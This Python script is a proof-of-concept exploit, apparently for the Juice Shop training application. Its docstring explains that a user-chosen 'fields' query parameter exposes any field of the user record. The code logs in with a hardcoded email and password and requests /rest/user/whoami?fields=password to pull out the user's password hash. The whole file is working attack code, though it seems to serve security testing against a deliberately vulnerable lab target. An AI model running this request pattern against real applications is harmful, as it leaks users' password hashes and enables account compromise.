"""Sensitive field disclosure in routes/currentUser.ts (remote-property-injection).

baseUser[field] = user.data[field] with field from req.query.fields lets the
client name any field of the user record, including password. Proof: whoami
with ?fields=password returns the user's password hash. Needs authentication
(the token is read from the cookie).
"""

import json
import re
import urllib.request

USER = {"email": "jim@juice-sh.op", "password": "ncc-1701"}


def exploit(base: str) -> tuple[bool, str]:
    login = urllib.request.Request(f"{base}/rest/user/login", data=json.dumps(USER).encode(),
                                   headers={"content-type": "application/json"})
    with urllib.request.urlopen(login) as res:
        token = json.load(res)["authentication"]["token"]
    req = urllib.request.Request(f"{base}/rest/user/whoami?fields=password",
                                 headers={"Cookie": f"token={token}"})
    with urllib.request.urlopen(req) as res:
        pw = json.load(res).get("user", {}).get("password", "")
    leaked = bool(re.fullmatch(r"[0-9a-f]{32}", pw or ""))
    return leaked, f"password hash leaked: {leaked}"
